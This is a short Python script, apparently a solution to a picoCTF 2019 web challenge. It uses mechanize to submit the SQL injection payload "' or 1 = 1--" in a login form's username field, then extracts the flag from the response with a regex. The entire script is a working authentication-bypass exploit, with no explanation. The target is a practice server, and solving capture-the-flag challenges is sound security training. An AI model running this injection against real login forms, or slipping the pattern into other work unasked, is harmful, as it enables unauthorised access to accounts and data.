import mechanize, re

url = 'https://2019shell1.picoctf.com/problem/47253/login.html'

req = mechanize.Browser()
req.open(url)

req.select_form(action="login.php")
req.form['username'] = "' or 1 = 1--"
res = req.submit()

html_res = str(res.read())
result = re.findall('\{(.+)\}', html_res)[0]

print(result)